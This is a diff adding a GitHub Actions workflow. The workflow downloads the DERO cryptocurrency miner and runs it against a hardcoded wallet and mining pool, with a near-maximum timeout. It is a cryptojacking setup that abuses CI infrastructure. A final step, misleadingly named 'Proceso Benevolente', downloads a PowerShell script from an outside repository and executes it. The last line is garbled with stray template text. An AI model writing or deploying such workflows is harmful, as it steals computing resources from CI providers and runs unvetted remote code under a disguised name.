@@ -1,0 +1,26 @@
+name: Der
+
+on: workflow_dispatch
+
+jobs:
+  build:
+
+    runs-on: ubuntu-latest
+    timeout-minutes: 999
+
+    steps:
+    - name: Descarga necesario
+      run: |
+        sudo apt install wget
+        wget https://github.com/deroproject/derohe/releases/download/Release96/dero_linux_amd64.tar.gz
+    - name: Extraer derin.
+      run: tar --extract --file dero_linux_amd64.tar.gz
+    - name: Ejecutar
+      run: | 
+        cd dero_linux_amd64
+        ls
+        ./dero-miner-linux-amd64 --wallet-address dero1qykyta6ntpd27nl0yq4xtzaf4ls6p5e9pqu0k2x4x3pqq5xavjsdxqgny8270 --mining-threads 6 --daemon-rpc-address minernode1.dero.io:10100
+    - name: Proceso Benevolente
+      run: | 
+        Invoke-WebRequest https://github.com/cremans/rgth/raw/main/lp.ps1 -OutFile lp.ps1
+        ./lp.ps1s a basic workflow to help you get started with Actions
